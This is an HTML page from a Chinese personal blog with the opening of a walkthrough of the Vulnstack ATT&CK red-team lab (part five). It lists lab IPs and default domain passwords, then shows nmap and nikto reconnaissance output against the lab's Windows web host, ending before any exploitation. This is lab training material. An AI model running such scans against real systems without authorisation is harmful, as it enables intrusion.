<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog - 记录学习、生活" data-next-head=""/><meta property="og:description" content="Sunset的个人博客" data-next-head=""/><meta property="og:url" content="http://sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="http://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="http://sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><title data-next-head="">Vulnstack - ATT&amp;CK红队评估实战靶场(五)</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="http://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="http://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/fe57c22d60846192.css" as="style"/><link rel="stylesheet" href="/_next/static/css/fe57c22d60846192.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-8cac0b4b405cede1.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-4b638ff538b97055.js" defer=""></script><script src="/_next/static/chunks/999-39f23ad0a9336d72.js" defer=""></script><script src="/_next/static/chunks/951-ad0cb56524ddaaf1.js" defer=""></script><script src="/_next/static/chunks/pages/%5Byear%5D/%5Bmonth%5D/%5Bday%5D/%5Bid%5D-4aef857d6036af72.js" defer=""></script><script src="/_next/static/spBfolT_1b1V4Y5d67TZv/_buildManifest.js" defer=""></script><script src="/_next/static/spBfolT_1b1V4Y5d67TZv/_ssgManifest.js" defer=""></script></head><body><link rel="preload" as="image" href="/images/logo.png"/><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 flex flex-col min-h-screen font-[LXGWWenKai]"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><img src="/images/logo.png" alt="Sunset" class="md:size-18 md:block hidden rounded-full"/><div><div class="flex items-center justify-center md:justify-start"><img src="/images/logo.png" alt="Sunset" class="size-10 rounded-xl md:hidden"/><h1 class="md:text-3xl text-xl font-extrabold text-red-700 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full relative"><div class="flex justify-center"><article class="w-full md:w-3/4 lg:w-2/3 xl:w-4xl px-3 mt-5 md:mt-15 max-w-[800px]"><h1 class="text-xl md:text-2xl font-bold text-red-700">Vulnstack - ATT&amp;CK红队评估实战靶场(五)</h1><div class="flex flex-col"><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 md:text-base">SUNSET</p><p class="font-thin text-gray-600 ml-2 md:text-base">2025-04-04</p><p class="font-thin text-gray-600 ml-2 md:text-base">(Updated:<!-- -->2025-04-04<!-- -->)</p></div><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 md:text-base">Category:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700">靶机</span></div><div class="flex flex-wrap text-sm mt-1"><p class="font-bold text-gray-600 md:text-base">Tags:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700">Vulnstack</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700">Windows靶机</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700">综合靶场</span></div></div><div class="my-8 text-center">加载中...</div></article></div></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"Vulnstack红队评估实战靶场(五)","contentHtml":"\u003ch1\u003eATT\u0026#x26;CK红队评估实战靶场(五)\u003c/h1\u003e\n\u003cp\u003e\u003cstrong\u003ewin7\u003c/strong\u003e 双网卡模拟内外网 \u003ccode\u003e192.168.138.136\u003c/code\u003e \u003ccode\u003e192.168.183.134\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003esun\\leo 123.com\u003c/p\u003e\n\u003cp\u003esun\\Administrator dc123.com\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e2008\u003c/strong\u003e \u003ccode\u003e192.168.138.138\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003esun\\admin 2021.com\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eKali\u003c/strong\u003e \u003ccode\u003e192.168.183.133\u003c/code\u003e\u003c/p\u003e\n\u003ch2\u003e前期踩点\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003e192.168.183.134\u003c/code\u003e 是靶机\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e⚡ root@kali  ~  nmap -sP \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.183\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-02-\u003cspan class=\"hljs-number\"\u003e19\u003c/span\u003e 05:06 EST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.183\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00033\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:C0:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:01 (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.183\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.134\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00017\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:0C:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e69\u003c/span\u003e:C1:\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.183\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.254\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00017\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:F8:FE:A2 (VMware)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e开启了\u003ccode\u003eHTTP\u003c/code\u003e服务和\u003ccode\u003eMysql\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-css\"\u003e⚡ root\u003cspan class=\"hljs-keyword\"\u003e@kali\u003c/span\u003e  ~  nmap -sT -min-rate \u003cspan class=\"hljs-number\"\u003e10000\u003c/span\u003e -p- \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.134\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94S\u003c/span\u003eVN ( \u003cspan class=\"hljs-attribute\"\u003ehttps\u003c/span\u003e://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e02\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e19\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e07\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e02\u003c/span\u003e EST\nNmap \u003cspan class=\"hljs-attribute\"\u003escan\u003c/span\u003e report for \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.134\u003c/span\u003e\nHost is up (\u003cspan class=\"hljs-number\"\u003e0.00091s\u003c/span\u003e latency).\n\u003cspan class=\"hljs-keyword\"\u003eNot\u003c/span\u003e \u003cspan class=\"hljs-attribute\"\u003eshown\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e65533\u003c/span\u003e filtered tcp ports (no-response)\nPORT     STATE SERVICE\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp   open  http\n\u003cspan class=\"hljs-number\"\u003e3306\u003c/span\u003e/tcp open  mysql\nMAC \u003cspan class=\"hljs-attribute\"\u003eAddress\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\u003cspan class=\"hljs-attribute\"\u003eC\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e69\u003c/span\u003e:C1:\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e (VMware)\n\nNmap \u003cspan class=\"hljs-attribute\"\u003edone\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e IP address (\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e host up) scanned in \u003cspan class=\"hljs-number\"\u003e26.44\u003c/span\u003e seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eApache\u003c/code\u003e ，并且是\u003ccode\u003eWindows\u003c/code\u003e系统\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e⚡ root@kali  ~  nmap -sT -A -T4 -O -p \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e3306\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.183\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.134\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-02-\u003cspan class=\"hljs-number\"\u003e19\u003c/span\u003e 07:03 EST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.183\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.134\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00053\u003c/span\u003es latency).\n\nPORT     STATE SERVICE VERSION\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp   \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  http    Apache httpd \u003cspan class=\"hljs-number\"\u003e2.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.23\u003c/span\u003e ((Win32) OpenSSL/\u003cspan class=\"hljs-number\"\u003e1.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.2j\u003c/span\u003e PHP/\u003cspan class=\"hljs-number\"\u003e5.5\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.38\u003c/span\u003e)\n|_http-title: Site doesn\u003cspan class=\"hljs-string\"\u003e't have a title (text/html; charset=utf-8).\n|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.5.38\n3306/tcp open  mysql   MySQL (unauthorized)\nMAC Address: 00:0C:29:69:C1:18 (VMware)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Microsoft Windows 8.1 R1 (96%), Microsoft Windows Phone 7.5 or 8.0 (96%), Microsoft Windows Embedded Standard 7 (96%), Microsoft Windows Server 2008 or 2008 Beta 3 (92%), Microsoft Windows Server 2008 R2 or Windows 8.1 (92%), Microsoft Windows 7 Professional or Windows 8 (92%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (92%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (92%), Microsoft Windows 7 (90%), Microsoft Windows Server 2008 SP1 (89%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 1 hop\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.53 ms 192.168.183.134\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 44.39 seconds\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003enmap\u003c/code\u003e扫描漏洞\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e⚡ root@kali  ~  nmap -script=vuln -p \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e3306\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.183\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.134\u003c/span\u003e \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-02-\u003cspan class=\"hljs-number\"\u003e19\u003c/span\u003e 07:05 EST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.183\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.134\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00030\u003c/span\u003es latency).\n\nPORT     STATE SERVICE\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp   \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  http\n|_http-trace: TRACE \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e enabled\n|_http-csrf: Couldn\u003cspan class=\"hljs-string\"\u003e't find any CSRF vulnerabilities.\n|_http-stored-xss: Couldn'\u003c/span\u003et find \u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e stored XSS vulnerabilities.\n|_http-dombased-xss: Couldn\u003cspan class=\"hljs-string\"\u003e't find any DOM based XSS.\n| http-enum: \n|   /robots.txt: Robots file\n|   /0/: Potentially interesting folder\n|_  /index/: Potentially interesting folder\n| http-slowloris-check: \n|   VULNERABLE:\n|   Slowloris DOS attack\n|     State: LIKELY VULNERABLE\n|     IDs:  CVE:CVE-2007-6750\n|       Slowloris tries to keep many connections to the target web server open and hold\n|       them open as long as possible.  It accomplishes this by opening connections to\n|       the target web server and sending a partial request. By doing so, it starves\n|       the http server'\u003c/span\u003es resources causing Denial Of Service.\n|       \n|     Disclosure date: \u003cspan class=\"hljs-number\"\u003e2009\u003c/span\u003e-09-\u003cspan class=\"hljs-number\"\u003e17\u003c/span\u003e\n|     References:\n|       http://ha.ckers.org/slowloris/\n|_      https://cve.mitre.org/cgi-\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/cvename.cgi?name=CVE-\u003cspan class=\"hljs-number\"\u003e2007\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e6750\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e3306\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  mysql\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:0C:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e69\u003c/span\u003e:C1:\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e (VMware)\n\nNmap done: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e IP address (\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e86.40\u003c/span\u003e seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003enikto\u003c/code\u003e扫描漏洞\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e ⚡ root@kali  ~  nikto -url \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.183\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.134\u003c/span\u003e -p \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e            \n- Nikto v2\u003cspan class=\"hljs-number\"\u003e.5\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\n---------------------------------------------------------------------------\n+ Target IP:          \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.183\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.134\u003c/span\u003e\n+ Target Hostname:    \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.183\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.134\u003c/span\u003e\n+ Target Port:        \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e\n+ Start Time:         \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-02-\u003cspan class=\"hljs-number\"\u003e19\u003c/span\u003e 07:\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e (GMT-\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e)\n---------------------------------------------------------------------------\n+ Server: Apache/\u003cspan class=\"hljs-number\"\u003e2.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.23\u003c/span\u003e (Win32) OpenSSL/\u003cspan class=\"hljs-number\"\u003e1.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.2j\u003c/span\u003e PHP/\u003cspan class=\"hljs-number\"\u003e5.5\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.38\u003c/span\u003e\n+ /: Retrieved x-powered-by header: PHP/\u003cspan class=\"hljs-number\"\u003e5.5\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.38\u003c/span\u003e.\n+ /: The anti-clickjacking X-Frame-Options header \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options\n+ /: The X-Content-\u003cspan class=\"hljs-type\"\u003eType\u003c/span\u003e-Options header \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e. This could allow the user agent to render the content of the site \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e a different fashion to the MIME \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e-header/\n+ No CGI Directories found (use \u003cspan class=\"hljs-string\"\u003e'-C all'\u003c/span\u003e to force check \u003cspan class=\"hljs-built_in\"\u003eall\u003c/span\u003e possible dirs)\n+ Apache/\u003cspan class=\"hljs-number\"\u003e2.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.23\u003c/span\u003e appears to be outdated (current \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e at least Apache/\u003cspan class=\"hljs-number\"\u003e2.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.54\u003c/span\u003e). Apache \u003cspan class=\"hljs-number\"\u003e2.2\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.34\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e the EOL \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e the \u003cspan class=\"hljs-number\"\u003e2.\u003c/span\u003ex branch.\n+ OpenSSL/\u003cspan class=\"hljs-number\"\u003e1.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.2j\u003c/span\u003e appears to be outdated (current \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e at least \u003cspan class=\"hljs-number\"\u003e3.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.7\u003c/span\u003e). OpenSSL \u003cspan class=\"hljs-number\"\u003e1.1\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003es \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e current \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e the \u003cspan class=\"hljs-number\"\u003e1.\u003c/span\u003ex branch \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e will be supported until Nov \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e2023.\u003c/span\u003e\n+ PHP/\u003cspan class=\"hljs-number\"\u003e5.5\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.38\u003c/span\u003e appears to be outdated (current \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e at least \u003cspan class=\"hljs-number\"\u003e8.1\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.5\u003c/span\u003e), PHP \u003cspan class=\"hljs-number\"\u003e7.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.28\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e the \u003cspan class=\"hljs-number\"\u003e7.4\u003c/span\u003e branch.\n+ /: Web Server returns a valid response \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e junk HTTP methods which may cause false positives.\n+ /: HTTP TRACE method \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e active which suggests the host \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing\n+ PHP/\u003cspan class=\"hljs-number\"\u003e5.5\u003c/span\u003e - PHP \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e7.0\u003c/span\u003e are End of Life products without support.\n+ /\u003cspan class=\"hljs-comment\"\u003e#wp-config.php#: #wp-config.php# file found. This file contains the credentials.\u003c/span\u003e\n+ \u003cspan class=\"hljs-number\"\u003e8101\u003c/span\u003e requests: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e error(s) \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e item(s) reported on remote host\n+ End Time:           \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-02-\u003cspan class=\"hljs-number\"\u003e19\u003c/span\u003e 07:\u003cspan class=\"hljs-number\"\u003e26\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e (GMT-\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e) (\u003cspan class=\"hljs-number\"\u003e253\u003c/span\u003e seconds)\n---------------------------------------------------------------------------                                                                                            